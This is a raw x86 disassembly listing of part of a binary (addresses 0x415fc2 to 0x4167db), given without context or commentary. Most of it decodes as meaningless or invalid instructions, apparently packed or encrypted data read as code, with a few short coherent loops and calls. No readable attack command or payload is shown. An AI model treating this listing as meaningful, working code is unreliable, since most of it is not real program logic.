  415fc2:	shl    BYTE PTR [edx],0xd5
  415fc5:	in     al,0xb0
  415fc7:	pusha  
  415fc8:	jae    0x416019
  415fca:	mov    ds:0x629c7362,eax
  415fcf:	out    0x3c,al
  415fd1:	jnp    0x415ff9
  415fd3:	or     ecx,esp
  415fd5:	addr16 push esp
  415fd7:	std    
  415fd8:	pushf  
  415fd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fda:	jns    0x415fa7
  415fdc:	jg     0x415fb5
  415fde:	jmp    0xc95e:0x96e5e7b
  415fe5:	jl     0x415f8c
  415fe7:	fbstp  TBYTE PTR [ecx]
  415fe9:	loop   0x415ffd
  415feb:	mov    ebx,DWORD PTR [ecx+0x37fdb22b]
  415ff1:	loop   0x415fc2
  415ff3:	sub    al,0x16
  415ff5:	(bad)  
  415ff6:	out    0x57,al
  415ff8:	xor    bh,al
  415ffa:	stos   DWORD PTR es:[edi],eax
  415ffb:	jo     0x415f9c
  415ffd:	adc    dh,BYTE PTR [ecx-0x4222c105]
  416003:	mov    edi,0xe6ce8fb1
  416008:	xchg   ebx,eax
  416009:	or     al,0xff
  41600b:	sub    esp,ebx
  41600d:	mov    dh,0x76
  41600f:	inc    esp
  416010:	jl     0x416026
  416012:	push   cs
  416013:	jg     0x415ff6
  416015:	sbb    al,0x32
  416017:	rcr    dh,1
  416019:	push   cs
  41601a:	test   DWORD PTR [edi+0x3ec04332],edi
  416020:	ds mov dl,0xcc
  416023:	add    eax,0x70b1d176
  416028:	push   esp
  416029:	sub    eax,0xd7f47a3f
  41602e:	push   edi
  41602f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416030:	aad    0xe9
  416032:	jns    0x41601e
  416034:	push   eax
  416035:	ret    0x9ed3
  416038:	sub    esi,esi
  41603a:	(bad)  
  41603b:	jo     0x416064
  41603d:	cmp    eax,0x80fcd553
  416042:	sub    al,BYTE PTR es:[esi+0x5276f422]
  416049:	cld    
  41604a:	out    0xa8,al
  41604c:	rcr    dh,cl
  41604e:	outs   dx,DWORD PTR ds:[esi]
  41604f:	jl     0x4160b2
  416051:	fsubp  st(0),st
  416053:	add    DWORD PTR [edi-0x7e],eax
  416056:	pop    es
  416057:	pop    eax
  416058:	test   DWORD PTR [esi+0x44267aff],edx
  41605e:	mov    eax,ds:0xbcda7814
  416063:	popa   
  416064:	jle    0x4160a9
  416066:	pop    ebx
  416067:	push   ebx
  416068:	adc    ebp,DWORD PTR [edi+0x6f67323d]
  41606e:	test   dl,ah
  416070:	dec    eax
  416071:	sbb    bh,cl
  416073:	in     eax,dx
  416074:	ror    ah,0x85
  416077:	xor    esi,DWORD PTR [eax+0x1b]
  41607a:	xchg   esi,eax
  41607b:	sub    ah,bh
  41607d:	(bad)  
  41607e:	cs jp  0x4160ec
  416081:	aam    0x60
  416083:	hlt    
  416084:	mov    edi,0x84d88b0
  416089:	xchg   edx,eax
  41608a:	pop    esp
  41608b:	ror    edi,cl
  41608d:	fild   DWORD PTR [ebx]
  41608f:	aaa    
  416090:	fwait
  416091:	fs and al,cl
  416094:	jecxz  0x41609c
  416096:	cmp    DWORD PTR [ecx],0xffffffab
  416099:	fcmovnb st,st(2)
  41609b:	scas   eax,DWORD PTR es:[edi]
  41609c:	shl    BYTE PTR [ebx],0x9d
  41609f:	sub    BYTE PTR [bp+0x27ca],dh
  4160a4:	jmp    0x6385d136
  4160a9:	dec    eax
  4160aa:	retf   
  4160ab:	addr16 push ebx
  4160ad:	pavgb  mm0,QWORD PTR [esi-0x4a3627fa]
  4160b4:	sub    cl,BYTE PTR [esi]
  4160b6:	lahf   
  4160b7:	jne    0x4160cf
  4160b9:	dec    edi
  4160ba:	int    0x65
  4160bc:	jbe    0x41612c
  4160be:	or     DWORD PTR [ebp+0x34],ebp
  4160c1:	mov    bl,0xe3
  4160c3:	push   ss
  4160c4:	xor    eax,0xb79d58bf
  4160c9:	cmp    eax,0x7fc223f2
  4160ce:	(bad)  
  4160d0:	mov    eax,0xcc5e9391
  4160d5:	fcom   QWORD PTR [edx-0x19]
  4160d8:	adc    eax,ebx
  4160da:	xchg   ecx,eax
  4160db:	sub    DWORD PTR [esi-0x375c14f8],ebx
  4160e1:	aaa    
  4160e2:	pusha  
  4160e3:	pop    eax
  4160e4:	lods   eax,DWORD PTR ds:[esi]
  4160e5:	test   al,0x66
  4160e7:	aas    
  4160e8:	(bad)  
  4160ea:	cmc    
  4160eb:	addr16 je 0x4160cb
  4160ee:	sar    DWORD PTR [ebx-0x4],cl
  4160f1:	xor    eax,0x5c47a083
  4160f6:	(bad)  
  4160f7:	fist   WORD PTR [edx-0x3d]
  4160fa:	xchg   esp,eax
  4160fb:	int3   
  4160fc:	jmp    0x7cff92df
  416101:	sub    ecx,ebp
  416103:	stos   BYTE PTR es:[edi],al
  416104:	dec    eax
  416105:	xor    DWORD PTR [ecx+0x76],esp
  416108:	push   esi
  416109:	aam    0x30
  41610b:	test   edi,0xfb0e53cd
  416111:	ret    0xdf9c
  416114:	sbb    eax,0x1f1bc793
  416119:	inc    edx
  41611a:	enter  0x5297,0xae
  41611e:	add    DWORD PTR [esp+ebx*4+0x29],esi
  416122:	mov    al,0xcc
  416124:	cli    
  416125:	cmp    al,0x52
  416127:	jge    0x416174
  416129:	mov    ss,WORD PTR [esi+0x61103c27]
  41612f:	sbb    DWORD PTR [ebx+edi*4+0x47],0x47
  416134:	stos   DWORD PTR es:[edi],eax
  416135:	sbb    eax,0x526a6904
  41613a:	sbb    ebx,esi
  41613c:	pop    eax
  41613d:	hlt    
  41613e:	scas   al,BYTE PTR es:[edi]
  41613f:	or     esi,DWORD PTR [edx+0x7676e9ca]
  416145:	and    DWORD PTR [eax+0xfc95dbf],edi
  41614b:	dec    edx
  41614c:	xor    DWORD PTR [esi+eax*8+0x3adea448],ecx
  416153:	out    dx,eax
  416154:	(bad)  
  416155:	es call 0xe259:0x1c3a922b
  41615d:	js     0x4160e5
  41615f:	aas    
  416160:	push   edi
  416161:	ins    DWORD PTR es:[edi],dx
  416162:	clc    
  416163:	xor    eax,0xcb92536c
  416168:	fst    QWORD PTR [esi-0x792e8491]
  41616e:	xor    BYTE PTR [ecx],ah
  416170:	push   ebx
  416171:	rol    ch,1
  416173:	adc    edx,DWORD PTR [edi]
  416175:	stos   BYTE PTR es:[edi],al
  416176:	sbb    BYTE PTR [esi-0x171a6e95],bl
  41617c:	mov    ecx,0xcb0c2dc1
  416181:	cwde   
  416182:	mov    dl,0x3b
  416184:	cmp    al,0x35
  416186:	or     esp,DWORD PTR [eax-0x17]
  416189:	mov    esi,0xab843303
  41618e:	xor    eax,0xe70b569f
  416193:	xor    eax,DWORD PTR [esi]
  416195:	sub    dl,bl
  416197:	fstp   QWORD PTR [ecx+ecx*4]
  41619a:	or     ecx,DWORD PTR [ebx]
  41619c:	shr    BYTE PTR [esi-0x7383e37c],1
  4161a2:	xchg   esi,eax
  4161a3:	mov    ebp,0x769d208b
  4161a8:	out    dx,eax
  4161a9:	pop    esi
  4161aa:	fdiv   st,st(7)
  4161ac:	lds    edx,FWORD PTR [ecx]
  4161ae:	adc    ch,al
  4161b0:	xchg   edx,eax
  4161b1:	test   esp,0xd66ac779
  4161b7:	aam    0x48
  4161b9:	sub    dl,BYTE PTR [edi+eiz*1-0x67]
  4161bd:	rcr    DWORD PTR [ecx-0x5c1ec629],1
  4161c3:	and    BYTE PTR [ebx],0x39
  4161c6:	pop    edi
  4161c7:	cmp    edx,DWORD PTR [ecx-0x39]
  4161ca:	inc    ebx
  4161cb:	out    dx,eax
  4161cc:	dec    esi
  4161cd:	push   ebp
  4161ce:	mov    ebp,0x5a023289
  4161d3:	xor    DWORD PTR ds:0x95468d41,edi
  4161d9:	jns    0x416209
  4161db:	retf   0x7631
  4161de:	mov    dl,0x96
  4161e0:	jbe    0x416163
  4161e2:	xchg   ecx,eax
  4161e3:	pop    esp
  4161e4:	mov    WORD PTR [edx-0x66fcf897],cs
  4161ea:	xor    ch,al
  4161ec:	pop    ecx
  4161ed:	adc    edi,DWORD PTR [esp+edx*8]
  4161f0:	test   BYTE PTR [ebx+0x5c7fc45],0x8d
  4161f7:	test   al,0x42
  4161f9:	add    BYTE PTR [eax+eax*1],bl
  4161fc:	add    BYTE PTR [eax],al
  4161fe:	cmp    DWORD PTR ds:0x42a88d,0x0
  416205:	je     0x41625b
  41620b:	cmp    DWORD PTR ds:0x42a88d,0xe
  416212:	jne    0x41622f
  416218:	push   0x7e45
  41621d:	push   DWORD PTR [ebp-0x1c]
  416220:	push   DWORD PTR [ebp-0xc]
  416223:	push   DWORD PTR [ebp-0x20]
  416226:	push   DWORD PTR [ebp-0x14]
  416229:	call   DWORD PTR ds:0x41d1f4
  41622f:	cmp    DWORD PTR ds:0x42a88d,0xf
  416236:	jne    0x416249
  41623c:	mov    edx,DWORD PTR ds:0x42a88d
  416242:	dec    edx
  416243:	mov    DWORD PTR ds:0x42a88d,edx
  416249:	mov    edx,DWORD PTR ds:0x42a88d
  41624f:	dec    edx
  416250:	mov    DWORD PTR ds:0x42a88d,edx
  416256:	jmp    0x4161fe
  41625b:	xor    eax,edi
  41625d:	add    eax,esi
  41625f:	add    DWORD PTR ds:0x42a769,edi
  416265:	push   eax
  416266:	push   DWORD PTR [ebp-0x8]
  416269:	push   DWORD PTR [ebp-0x4]
  41626c:	mov    edx,DWORD PTR ds:0x41eae6
  416272:	add    DWORD PTR ds:0x42a841,0x2531
  41627c:	jmp    0x416534
  416281:	ret    0x3fc0
  416284:	leave  
  416285:	leave  
  416286:	leave  
  416287:	retf   0x22c7
  41628a:	add    esp,DWORD PTR [ebx-0x2de62c46]
  416290:	aad    0xbc
  416292:	sbb    BYTE PTR [edi+0x78],bh
  416295:	xchg   ebp,eax
  416296:	jle    0x416310
  416298:	js     0x4162cc
  41629a:	mov    bl,0xb0
  41629c:	push   ds
  41629d:	push   ecx
  41629e:	cmc    
  41629f:	out    0x36,eax
  4162a1:	call   0xf788522a
  4162a6:	rol    DWORD PTR [edx+0x51],0xf6
  4162aa:	mov    edi,ebx
  4162ac:	jns    0x41626c
  4162ae:	icebp  
  4162af:	push   ss
  4162b0:	sbb    dh,dl
  4162b2:	jnp    0x4162f1
  4162b4:	xor    edi,DWORD PTR [eax-0x37]
  4162b7:	fucomip st,st(5)
  4162b9:	dec    ecx
  4162ba:	fstp   DWORD PTR [eax]
  4162bc:	lahf   
  4162bd:	adc    ebp,DWORD PTR [esi]
  4162bf:	mov    ds:0x5674f2b6,al
  4162c4:	cmp    al,0x41
  4162c6:	sbb    eax,0x9f5dc62f
  4162cb:	lods   eax,DWORD PTR ds:[esi]
  4162cc:	xlat   BYTE PTR ds:[ebx]
  4162cd:	push   eax
  4162ce:	loop   0x416332
  4162d0:	push   esp
  4162d1:	ins    DWORD PTR es:[edi],dx
  4162d2:	lods   al,BYTE PTR ds:[esi]
  4162d3:	pusha  
  4162d4:	fwait
  4162d5:	push   ebx
  4162d6:	adc    eax,0x58ce487f
  4162db:	add    BYTE PTR [edx-0x16],ch
  4162de:	xchg   edx,eax
  4162df:	inc    ebp
  4162e0:	dec    esp
  4162e1:	sbb    eax,0x450e361a
  4162e6:	gs sbb al,0xf3
  4162e9:	aas    
  4162ea:	push   ecx
  4162eb:	sbb    ch,BYTE PTR [esi]
  4162ed:	or     eax,0x94b0d880
  4162f2:	jae    0x4162b4
  4162f4:	scas   al,BYTE PTR es:[edi]
  4162f5:	idiv   BYTE PTR [eax]
  4162f7:	(bad)  
  4162f8:	clc    
  4162f9:	repz ret 0x5c46
  4162fd:	aad    0xdf
  4162ff:	aam    0x6e
  416301:	hlt    
  416302:	mov    al,ds:0x8521e17a
  416307:	adc    al,0x44
  416309:	adc    al,0xbc
  41630b:	push   cs
  41630c:	out    dx,eax
  41630d:	ja     0x416381
  41630f:	imul   esp,DWORD PTR [eax-0x63cd846a],0xb783c774
  416319:	sbb    eax,0xb16a79
  41631e:	fcom   DWORD PTR [ebp+0x1c54cd8d]
  416324:	xchg   ecx,eax
  416325:	nop
  416326:	jle    0x4162b0
  416328:	cwde   
  416329:	fstp   TBYTE PTR [ecx+0x15]
  41632c:	jp     0x416339
  41632e:	jl     0x4162b3
  416330:	sub    ah,dl
  416332:	jmp    DWORD PTR [esi-0x1b]
  416335:	mov    BYTE PTR [eax+eax*2+0x424f3ced],0x77
  41633d:	jbe    0x41635b
  41633f:	hlt    
  416340:	mov    esp,DWORD PTR [eax-0x4e]
  416343:	dec    eax
  416344:	cmp    al,0xc
  416346:	mov    esi,0x46f2ac10
  41634b:	(bad)  
  41634c:	adc    DWORD PTR [esi+eiz*2-0x62],esi
  416350:	in     eax,dx
  416351:	jno    0x416321
  416353:	ror    BYTE PTR [edx+0x78e914fb],cl
  416359:	js     0x416388
  41635b:	pusha  
  41635c:	lds    edi,FWORD PTR ds:0xdfe922d6
  416362:	mov    cl,0x69
  416364:	(bad)  [edi+0xf]
  416367:	fsub   DWORD PTR [ecx-0x200de2ae]
  41636d:	scas   al,BYTE PTR es:[edi]
  41636e:	jg     0x41635f
  416370:	cmp    esp,edi
  416372:	or     BYTE PTR [eax-0x78],al
  416375:	bound  ebx,QWORD PTR [ecx+0x12]
  416378:	mov    ebp,0xc307178a
  41637d:	dec    edi
  41637e:	repnz push ss
  416380:	ins    DWORD PTR es:[edi],dx
  416381:	lods   eax,DWORD PTR ds:[esi]
  416382:	mov    fs,eax
  416384:	and    esp,DWORD PTR [edx-0x5f97df84]
  41638a:	sbb    eax,0x25ba9232
  41638f:	leave  
  416390:	in     al,dx
  416391:	call   FWORD PTR [ecx]
  416393:	stc    
  416394:	pop    ebx
  416395:	sbb    al,0xe7
  416397:	arpl   WORD PTR [edi+ecx*4+0x6992cf2a],dx
  41639e:	pop    ds
  41639f:	mov    dh,0x72
  4163a1:	lock mov ebp,0xee86d0f4
  4163a7:	cld    
  4163a8:	and    DWORD PTR [ebx+0x6688dbd8],0xffffffa8
  4163af:	adc    ebx,esi
  4163b1:	xchg   ecx,eax
  4163b2:	push   ss
  4163b3:	aam    0x90
  4163b5:	out    0xad,eax
  4163b7:	inc    eax
  4163b8:	scas   al,BYTE PTR es:[edi]
  4163b9:	mov    bl,0x4f
  4163bb:	int    0xec
  4163bd:	call   0x84c7490e
  4163c2:	inc    ah
  4163c4:	and    bl,bh
  4163c6:	inc    esi
  4163c7:	iret   
  4163c8:	pop    edi
  4163c9:	ret    0x2b52
  4163cc:	test   eax,0x493dd8a3
  4163d1:	mov    ebx,0xcb69800
  4163d6:	or     DWORD PTR [eax+0x7f],edi
  4163d9:	xchg   esp,eax
  4163da:	out    0x6b,eax
  4163dc:	sbb    dh,BYTE PTR [edi+ebx*2]
  4163df:	sbb    edi,DWORD PTR [esi]
  4163e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163e2:	pusha  
  4163e3:	or     al,0x70
  4163e5:	adc    eax,0xa6fad156
  4163ea:	lea    edi,[ebx+0x8]
  4163ed:	pop    ebp
  4163ee:	cwde   
  4163ef:	loopne 0x41642a
  4163f1:	xchg   esp,eax
  4163f2:	lods   al,BYTE PTR ds:[esi]
  4163f3:	cmp    DWORD PTR [eax],ebp
  4163f5:	imul   edi,ebp,0x68
  4163f8:	sub    bh,BYTE PTR [ebx]
  4163fa:	pop    esp
  4163fb:	test   eax,0x3d90a13f
  416400:	mov    dh,0x5c
  416402:	imul   ebp,edx,0xf8c4834e
  416408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416409:	mov    WORD PTR [ebx],es
  41640b:	mov    bh,0x1d
  41640d:	pop    edx
  41640e:	retf   0x5d05
  416411:	push   ds
  416412:	xor    DWORD PTR [eax+0x38cdddb6],0x20
  416419:	loope  0x4163aa
  41641b:	out    0x76,eax
  41641d:	adc    al,0x47
  41641f:	or     al,BYTE PTR [ebx+0x168198d0]
  416425:	xchg   BYTE PTR [edi+edi*4+0x15],cl
  416429:	inc    edx
  41642a:	test   ch,dl
  41642c:	jl     0x416480
  41642e:	cmp    al,ch
  416430:	sahf   
  416431:	icebp  
  416432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416433:	mov    DWORD PTR [ecx],ebp
  416435:	pop    ss
  416436:	lds    eax,FWORD PTR [ecx]
  416438:	(bad)  
  416439:	inc    edx
  41643a:	mov    esp,0x6d062ffd
  41643f:	xchg   BYTE PTR [ebx],bl
  416441:	push   ds
  416442:	inc    edi
  416443:	out    0x6d,al
  416445:	jle    0x41640e
  416447:	push   ebx
  416448:	sbb    BYTE PTR [ecx-0x13a217f5],0x34
  41644f:	sub    eax,0xb935b176
  416454:	dec    eax
  416455:	fisubr DWORD PTR [edx]
  416457:	retf   
  416458:	js     0x416482
  41645a:	sbb    ebp,DWORD PTR [ebx+0x8]
  41645d:	loopne 0x416409
  41645f:	aam    0x9b
  416461:	mov    bl,0xb2
  416463:	dec    esp
  416464:	aaa    
  416465:	or     bh,BYTE PTR [ecx+0x62]
  416468:	mov    ebx,DWORD PTR [eax+eiz*1-0x3d]
  41646c:	push   edx
  41646d:	adc    bh,ah
  41646f:	sti    
  416470:	sbb    dh,BYTE PTR [esp+ebx*1]
  416473:	mov    dh,0xc2
  416475:	mov    dh,0x3c
  416477:	xchg   ebx,eax
  416478:	inc    ecx
  416479:	add    ah,BYTE PTR [eax]
  41647b:	pop    ss
  41647c:	mov    ds:0x795bde3d,al
  416481:	fistp  WORD PTR [esi]
  416483:	jmp    FWORD PTR [ecx]
  416485:	jmp    0xa61cfe9a
  41648a:	xor    cl,BYTE PTR [ebp+ebp*2+0x47]
  41648e:	js     0x41646d
  416490:	int3   
  416491:	dec    ebx
  416492:	and    edx,DWORD PTR [edx]
  416494:	add    bh,ch
  416496:	inc    esi
  416497:	jo     0x416465
  416499:	xlat   BYTE PTR ds:[ebx]
  41649a:	jno    0x4164eb
  41649c:	and    BYTE PTR [esi],al
  41649e:	int3   
  41649f:	gs dec eax
  4164a1:	std    
  4164a2:	imul   ebp,DWORD PTR [eax],0xe6d1d641
  4164a8:	cmc    
  4164a9:	int3   
  4164aa:	retf   
  4164ab:	mov    cs,WORD PTR [edi+0x93c8ba2]
  4164b1:	int3   
  4164b2:	cmp    DWORD PTR [edx+0x4911e07b],ebx
  4164b8:	mov    al,0xa
  4164ba:	adc    ch,BYTE PTR [edx+0x47]
  4164bd:	mov    dh,0x43
  4164bf:	mov    eax,0x46c10af6
  4164c4:	pop    ebp
  4164c5:	mov    ch,0xf3
  4164c7:	or     al,0x7
  4164c9:	cld    
  4164ca:	mov    ebp,0x8962bb1
  4164cf:	cli    
  4164d0:	push   ebx
  4164d1:	inc    esp
  4164d2:	add    DWORD PTR [eax-0x49],edx
  4164d5:	imul   eax,DWORD PTR ds:0x78f3f344,0xffffffcc
  4164dc:	inc    esp
  4164dd:	ss mov esi,0xe79d4163
  4164e3:	add    eax,0x27eefce7
  4164e8:	mov    esi,0xd9a5503
  4164ed:	test   edx,esi
  4164ef:	outs   dx,DWORD PTR ds:[esi]
  4164f0:	dec    esp
  4164f1:	mov    dl,0x9b
  4164f3:	fdiv   DWORD PTR [esi+0x799973bd]
  4164f9:	or     al,0x44
  4164fb:	hlt    
  4164fc:	jnp    0x41648c
  4164fe:	jns    0x41650c
  416500:	xor    BYTE PTR [ecx+0x1b1282f2],cl
  416506:	mov    eax,gs:0x66ff97b5
  41650c:	test   BYTE PTR [eax],ch
  41650e:	mov    cl,0x77
  416510:	xchg   DWORD PTR [esi],esp
  416512:	aam    0x83
  416514:	sbb    ebp,DWORD PTR [ecx+eax*1]
  416517:	inc    ebx
  416518:	adc    eax,0xcd2554ef
  41651d:	push   ebp
  41651e:	pop    edx
  41651f:	jle    0x416505
  416521:	clc    
  416522:	sub    BYTE PTR [edx+ecx*2+0x7e97db16],0x31
  41652a:	test   BYTE PTR [eax-0x7e],bh
  41652d:	jae    0x4164d7
  41652f:	mov    ah,ah
  416531:	div    DWORD PTR [eax+0x1832e8b1]
  416537:	add    BYTE PTR [eax],al
  416539:	mov    ecx,DWORD PTR ds:0x41eae6
  41653f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416545:	jmp    0x4167fd
  41654a:	ret    
  41654b:	int3   
  41654c:	(bad)  
  41654d:	int3   
  41654e:	aad    0xda
  416550:	leave  
  416551:	rol    DWORD PTR [ebp+0x19e37c66],cl
  416557:	popa   
  416558:	sub    esi,edi
  41655a:	fstp   DWORD PTR ds:0x7e95787f
  416560:	js     0x4165da
  416562:	adc    ebx,DWORD PTR [edx+0x7c]
  416565:	cdq    
  416566:	out    dx,al
  416567:	sbb    eax,eax
  416569:	push   ebx
  41656a:	lea    esp,[esi+0x2f]
  41656d:	xchg   esi,eax
  41656e:	repnz outs dx,BYTE PTR ds:[esi]
  416570:	jmp    0xde432dc6
  416575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416576:	out    0x78,eax
  416578:	pop    ss
  416579:	les    ebp,FWORD PTR [esi]
  41657b:	rcl    BYTE PTR [ecx+0x6516ad68],1
  416581:	lahf   
  416582:	pushf  
  416583:	mov    edi,0x4b3d167b
  416588:	inc    ebx
  416589:	in     al,dx
  41658a:	stos   DWORD PTR es:[edi],eax
  41658b:	sub    ebp,DWORD PTR [edi+0x23]
  41658e:	std    
  41658f:	xor    DWORD PTR [esi],ecx
  416591:	fwait
  416592:	test   DWORD PTR [ebp-0x164fe449],edi
  416598:	push   edi
  416599:	adc    BYTE PTR [ebx-0x32c536c0],ah
  41659f:	loop   0x4165d2
  4165a1:	jmp    0x7e55:0x8e582d1f
  4165a8:	aaa    
  4165a9:	xchg   BYTE PTR [ebp-0x13],dh
  4165ac:	(bad)  
  4165ad:	cmp    DWORD PTR [edx+0x8ba044a],eax
  4165b3:	sahf   
  4165b4:	xor    bh,BYTE PTR [ecx]
  4165b6:	xchg   dl,al
  4165b8:	js     0x416600
  4165ba:	js     0x416560
  4165bc:	sti    
  4165bd:	adc    al,0x1d
  4165bf:	jnp    0x416640
  4165c1:	retf   0x5515
  4165c4:	fst    QWORD PTR [edi+edi*1-0x29]
  4165c8:	or     BYTE PTR [ecx],dl
  4165ca:	retf   0x88f3
  4165cd:	(bad)  
  4165ce:	loopne 0x416551
  4165d0:	sahf   
  4165d1:	test   al,0xef
  4165d3:	push   edx
  4165d4:	mov    esi,DWORD PTR ds:0x758357e6
  4165da:	mov    esp,0x41d82981
  4165df:	(bad)  
  4165e0:	xchg   ebx,eax
  4165e1:	jg     0x416584
  4165e3:	mov    WORD PTR [eax+0x611ec59a],?
  4165e9:	or     ecx,esi
  4165eb:	cmp    eax,DWORD PTR [edx-0x16fbea4f]
  4165f1:	imul   si,WORD PTR [esi+0x20],0xe05
  4165f7:	adc    cl,BYTE PTR [edx-0xee713b0]
  4165fd:	into   
  4165fe:	adc    al,0x80
  416600:	push   ebx
  416601:	leave  
  416602:	in     eax,0xe2
  416604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416605:	sbb    eax,0x119c156f
  41660a:	test   al,0xa8
  41660d:	dec    edi
  41660e:	xor    DWORD PTR ds:0xc8308e4,0x18
  416615:	imul   esi,DWORD PTR [eax+0x4],0x86412e66
  41661c:	push   ebp
  41661d:	xchg   ebx,eax
  41661e:	test   BYTE PTR gs:[edx-0x49758b6a],dh
  416625:	fwait
  416626:	or     BYTE PTR [ecx],ch
  416628:	(bad)  
  416629:	lods   al,BYTE PTR ds:[esi]
  41662a:	inc    ebp
  41662b:	fisttp QWORD PTR [edx+0x59bdd3d0]
  416631:	pop    ebx
  416632:	les    edx,FWORD PTR [esi+0x730a4a31]
  416638:	adc    al,0xbe
  41663a:	push   ss
  41663b:	or     eax,0x8c6c5aad
  416640:	mov    ecx,0x64590c5
  416645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416646:	imul   eax,eax,0x72
  416649:	dec    edx
  41664a:	call   FWORD PTR [eax-0x419a4456]
  416650:	jecxz  0x41664f
  416652:	mov    bh,0xc0
  416654:	jle    0x416685
  416656:	pop    ecx
  416657:	or     al,0xd8
  416659:	aaa    
  41665a:	outs   dx,DWORD PTR ds:[esi]
  41665b:	out    dx,eax
  41665c:	dec    edx
  41665d:	aam    0xc8
  41665f:	push   edx
  416660:	arpl   WORD PTR [eax],di
  416662:	add    al,0xef
  416664:	inc    esi
  416665:	push   ecx
  416666:	mov    edx,0x378b7598
  41666b:	xor    ch,BYTE PTR [ebp-0xfdc7f6f]
  416671:	inc    edx
  416672:	sub    esi,DWORD PTR [esi]
  416674:	mov    edi,?
  416676:	sar    BYTE PTR [edi],1
  416678:	cmp    edi,0xecfdf788
  41667e:	jae    0x4166b3
  416680:	inc    ebp
  416681:	mov    dl,BYTE PTR [edx+0x53]
  416684:	shr    DWORD PTR [ecx],0x84
  416687:	sub    al,dh
  416689:	int3   
  41668a:	aam    0x2f
  41668c:	push   0xffffff8d
  41668e:	and    bl,bl
  416690:	jae    0x416613
  416692:	mov    dl,bl
  416694:	push   cs
  416695:	xchg   ecx,eax
  416696:	cwde   
  416697:	daa    
  416698:	xor    edi,DWORD PTR [ebx-0x38e2ca7c]
  41669e:	mov    esp,0x3adf3274
  4166a3:	xor    ebx,esp
  4166a5:	dec    ebx
  4166a6:	push   cs
  4166a7:	loope  0x416716
  4166a9:	lods   al,BYTE PTR ds:[esi]
  4166aa:	mov    ds:0x18bcaff6,al
  4166af:	dec    esp
  4166b0:	jmp    0x3a832051
  4166b5:	lods   al,BYTE PTR ds:[esi]
  4166b6:	sbb    eax,0xa4a2252f
  4166bb:	adc    eax,eax
  4166bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166be:	je     0x41669c
  4166c0:	mov    eax,ds:0x145a7f4d
  4166c5:	test   DWORD PTR [ebx+edx*8],ebx
  4166c8:	jae    0x416680
  4166ca:	mov    bl,0xbb
  4166cc:	sub    al,BYTE PTR ds:0x7bee2c48
  4166d2:	xor    BYTE PTR [esp+ebx*4-0x5a],0x80
  4166d7:	retf   0x666b
  4166da:	enter  0xc96a,0xa9
  4166de:	push   ss
  4166df:	inc    edx
  4166e0:	mov    ah,0x28
  4166e2:	aam    0xe6
  4166e4:	sar    BYTE PTR [ebx+ebx*8-0x45],cl
  4166e8:	dec    ecx
  4166e9:	in     al,0xbc
  4166eb:	jge    0x4166a0
  4166ed:	xchg   esi,eax
  4166ee:	push   ebp
  4166ef:	ret    
  4166f0:	inc    esi
  4166f1:	cld    
  4166f2:	push   eax
  4166f3:	xchg   ebx,eax
  4166f4:	enter  0xf777,0xa4
  4166f8:	cmp    BYTE PTR [edi],al
  4166fa:	lods   eax,DWORD PTR ds:[esi]
  4166fb:	outs   dx,BYTE PTR ds:[esi]
  4166fc:	adc    eax,0xac501a0c
  416701:	cli    
  416702:	mov    cl,0x71
  416704:	jle    0x4166e4
  416706:	int3   
  416707:	mov    ecx,cs
  416709:	data16 mov ah,0x4a
  41670c:	fimul  DWORD PTR [ebp+0x668fa67]
  416712:	(bad)  
  416713:	icebp  
  416714:	into   
  416715:	jo     0x416767
  416717:	or     al,0xbc
  416719:	and    eax,0x5caa0a9b
  41671e:	call   0x5aaaf726
  416723:	adc    eax,0xc6d42c82
  416728:	and    eax,0x872c08b3
  41672d:	ja     0x4166c6
  41672f:	sub    DWORD PTR [edi],ecx
  416731:	loope  0x41670b
  416733:	imul   eax,DWORD PTR [edi+0x20d5213],0x2b
  41673a:	cmp    al,0x35
  41673c:	fidiv  DWORD PTR [edi+0x31]
  41673f:	aad    0xf9
  416741:	inc    edx
  416742:	imul   edi,DWORD PTR [edx+esi*1-0x58],0xffffffcb
  416747:	mov    cl,0x74
  416749:	adc    edx,eax
  41674b:	xchg   BYTE PTR [edi-0x536db83e],dh
  416751:	rcl    cl,cl
  416753:	arpl   WORD PTR [esi-0x10d8d49],sp
  416759:	icebp  
  41675a:	shl    BYTE PTR [eax-0x64],1
  41675d:	jae    0x416781
  41675f:	dec    edx
  416760:	mov    eax,0x4d10eace
  416765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416766:	retf   0x660b
  416769:	push   esp
  41676a:	mov    ecx,0xbedb103d
  41676f:	and    al,0xc4
  416771:	mov    DWORD PTR [ebx],ebx
  416773:	ins    BYTE PTR es:[edi],dx
  416774:	jecxz  0x4167b3
  416776:	pop    ebx
  416777:	and    edi,DWORD PTR [edx-0x49]
  41677a:	ds push edx
  41677c:	and    edi,DWORD PTR [ecx+0x1c58bacf]
  416782:	dec    eax
  416783:	retf   
  416784:	jns    0x41671f
  416786:	jno    0x416779
  416788:	dec    eax
  416789:	mov    edx,0x6897b62d
  41678e:	sub    dh,dh
  416790:	bound  ebp,QWORD PTR [esi+0x4bdd4cd5]
  416796:	ret    
  416797:	pop    ebx
  416798:	mov    eax,0xeb91ea09
  41679d:	adc    al,0x29
  41679f:	xchg   edx,eax
  4167a0:	stos   BYTE PTR es:[edi],al
  4167a1:	mov    al,ds:0x4fdc2f68
  4167a6:	je     0x4167e0
  4167a8:	repnz pop edx
  4167aa:	add    BYTE PTR [eax+0x23],ah
  4167ad:	div    BYTE PTR [ecx+0x75]
  4167b0:	ja     0x4167b6
  4167b2:	pusha  
  4167b3:	mov    bh,0xe6
  4167b5:	mov    ds:0x95eb4e2f,eax
  4167ba:	icebp  
  4167bb:	bound  edx,QWORD PTR [edx+0x38c7973a]
  4167c1:	mov    DWORD PTR [edi+0x246c396c],esp
  4167c7:	shl    BYTE PTR ds:0x7605757a,0xfe
  4167ce:	shr    BYTE PTR ds:0x3d3dbd22,cl
  4167d4:	jno    0x4167f8
  4167d6:	sbb    eax,0x42c84338
  4167db:	mov    ds:0x1e3e2993,eax
